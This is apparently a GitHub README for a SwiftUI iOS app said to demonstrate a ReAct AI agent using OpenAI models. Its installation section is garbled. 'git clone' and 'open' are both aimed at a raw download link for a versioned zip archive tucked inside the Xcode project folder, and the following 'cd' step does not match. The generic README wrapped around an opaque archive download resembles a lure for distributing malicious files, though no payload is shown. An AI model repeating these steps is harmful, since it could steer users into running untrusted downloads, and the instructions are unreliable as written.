## Overview

The **Swift AI Agent Demo** is a native iOS application that demonstrates the ReAct (Reasoning + Acting) AI agent pattern using SwiftUI. This app allows users to observe how an AI agent thinks, acts, and solves problems step-by-step. The application leverages OpenAI's GPT models to showcase real-time interactions and intelligent responses.

The project serves as an excellent learning tool for developers interested in artificial intelligence, automation, and mobile app development. With a focus on Swift and SwiftUI, this demo provides a clear example of how to integrate AI capabilities into iOS applications.

## Features

- **Real-Time AI Interaction**: Experience live interactions with the AI agent.
- **Step-by-Step Problem Solving**: Watch how the AI approaches and solves problems.
- **SwiftUI Interface**: A modern, responsive UI built with SwiftUI.
- **OpenAI Integration**: Utilizes GPT models for natural language processing.
- **Demo Scenarios**: Predefined scenarios to demonstrate AI capabilities.

## Getting Started

### Prerequisites

Before you begin, ensure you have the following:

- Xcode 13.0 or later
- macOS 11.0 or later
- Basic knowledge of Swift and SwiftUI

### Installation

1. Clone the repository:

   ```bash
   git clone https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip
   ```

2. Navigate to the project directory:

   ```bash
   cd swift-ai-agent-demo
   ```

3. Open the project in Xcode:

   ```bash
   open https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip
   ```

4. Build and run the application on your iOS device or simulator.

## Usage

Once the app is running, you can interact with the AI agent by entering questions or problems. The AI will process your input and respond with reasoning and actions. You can explore different scenarios to see how the AI adapts its responses.

## Architecture

The architecture of the Swift AI Agent Demo is designed to be modular and easy to understand. It consists of the following components:

- **Model**: This layer handles data and business logic. It includes the AI agent's reasoning capabilities and integrates with OpenAI's API.
  
- **View**: Built with SwiftUI, the view layer presents the user interface and handles user interactions.

- **ViewModel**: This layer connects the model and view, managing the flow of data and user input.

The separation of concerns ensures that the application is maintainable and scalable.
